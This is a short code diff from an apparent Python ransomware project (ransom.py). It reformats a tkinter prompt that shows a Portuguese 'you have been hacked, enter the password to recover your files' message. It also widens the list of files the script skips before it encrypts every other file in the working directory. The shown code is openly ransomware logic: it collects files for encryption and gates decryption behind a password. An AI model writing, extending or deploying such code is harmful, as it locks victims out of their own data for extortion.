@@ -15,7 +15,10 @@ def dialogBoxInput():
   root.withdraw()
 
   while True:
-    usrPassword = simpledialog.askstring("Input", f"☠️☠️Você foi hackeado☠️☠️ \n Insira a senha para recuperar seus arquivos: ")
+    usrPassword = simpledialog.askstring(
+      "Input", 
+      f"☠️☠️Você foi hackeado☠️☠️ \n Insira a senha para recuperar seus arquivos: "
+    )
 
     if usrPassword == password:
       decryptFiles(selectedFiles=allFiles)
@@ -44,7 +47,7 @@ def decryptFiles(selectedFiles: list[str]):
 
 for file in os.listdir():
   if os.path.isfile(file):
-    if file in ["ransom.py", "decrypt.py"]:
+    if file in ["ransom.py", "decrypt.py", "requirements.txt", ".gitignore"]:
       continue
     allFiles.insert(len(allFiles), file)
 encryptFiles(allFiles)
